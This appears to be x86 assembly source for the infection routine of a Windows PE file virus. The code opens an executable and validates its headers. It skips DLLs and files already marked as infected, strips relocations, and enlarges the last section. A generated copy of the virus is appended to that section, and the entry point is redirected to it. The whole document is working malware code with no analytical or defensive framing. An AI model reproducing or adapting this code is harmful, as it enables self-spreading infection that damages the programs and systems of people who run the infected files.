
; file infecting subroutine. REDUCED to be as simple as possible.

; input: EDX=file name

infect_file             proc    pascal
                        local   mz:BYTE:size mz_struc
                        local   oe:BYTE:size oe_struc
                        local   pe:BYTE:size pe_struc
                        local   last_oe_offs
                        pusha

                        seh_init

                        lea     esi, pe
                        lea     edi, oe

                        call    fopen_rw
                        jc      __exit
                        xchg    ebx, eax

                        lea     edx, mz
                        mov     ecx, size mz_struc
                        call    fread
                        cmp     eax, ecx
                        jne     __close

                        cmp     [edx].mz_id, 'ZM'
                        jne     __close

                        mov     edx, mz.mz_neptr
                        call    fseek

                        mov     edx, esi
                        mov     ecx, size pe_struc
                        call    fread
                        cmp     eax, ecx
                        jne     __close

                        cmp     [esi].pe_id, 'EP'
                        jne     __close

                        test    [esi].pe_exeflags, 2000h ; dll?
                        jnz     __close
                        or      [esi].pe_exeflags, 0001h ; strip relocs

                        cmp     [esi].pe_entrypointrva, 0
                        je      __close

                        cmp     [esi].pe_linkminor, 'Z' ; alredy processed?
                        je      __close
                        mov     [esi].pe_linkminor, 'Z'

                        xor     eax, eax
                        mov     [esi].pe_checksum, eax
                        mov     [esi].pe_fixuptablerva, eax
                        mov     [esi].pe_fixuptablesize, eax

                        movzx   ecx, [esi].pe_numofobjects
                        dec     ecx
                        imul    ecx, size oe_struc
                        mov     edx, mz.mz_neptr
                        add     edx, pe_ntheader_id-pe_id
                        movzx   eax, [esi].pe_ntheadersize
                        add     edx, eax
                        add     edx, ecx
                        mov     last_oe_offs, edx
                        call    fseek

                        mov     edx, edi
                        mov     ecx, size oe_struc
                        call    fread

                        xor     eax, eax
                        cmp     [edi].oe_virt_size, eax
                        je      __close
                        cmp     [edi].oe_phys_size, eax
                        je      __close

                        mov     ecx, [esi].pe_filealign
                        dec     ecx
                        add     [edi].oe_phys_size, ecx
                        not     ecx
                        and     [edi].oe_phys_size, ecx

                        mov     ecx, [esi].pe_objectalign
                        dec     ecx
                        add     [edi].oe_virt_size, ecx
                        not     ecx
                        and     [edi].oe_virt_size, ecx

                        mov     edx, [edi].oe_phys_offs
                        add     edx, [edi].oe_phys_size
                        call    fseek

                        mov     eax, [edi].oe_virt_rva
                        add     eax, [edi].oe_phys_size
                        add     eax, [esi].pe_imagebase
                        mov     patch_start, eax

                        mov     eax, [esi].pe_entrypointrva
                        add     eax, [esi].pe_imagebase
                        mov     patch_eip, eax

                        call    gen_copy
                        jc      __close

                        mov     eax, [edi].oe_phys_size
                        add     eax, [edi].oe_virt_rva
                        add     eax, buf_entry
                        mov     [esi].pe_entrypointrva, eax
                        mov     eax, buf_size
                        add     [edi].oe_phys_size, eax
                        add     [edi].oe_virt_size, eax
                        add     [esi].pe_sizeofcode, eax
                        add     [esi].pe_imagesize, eax

                        mov     ecx, buf_size
                        mov     edx, buf_ptr
                        call    fwrite
                        jc      __close

                        mov     edx, mz.mz_neptr
                        call    fseek

                        mov     edx, esi
                        mov     ecx, size pe_struc
                        call    fwrite
                        jc      __close

                        mov     edx, last_oe_offs
                        call    fseek

                        mov     edx, edi
                        mov     ecx, size oe_struc
                        call    fwrite

__close:                call    fclose

__exit:                 seh_done

                        popa
                        ret

                        endp    ; infect_file
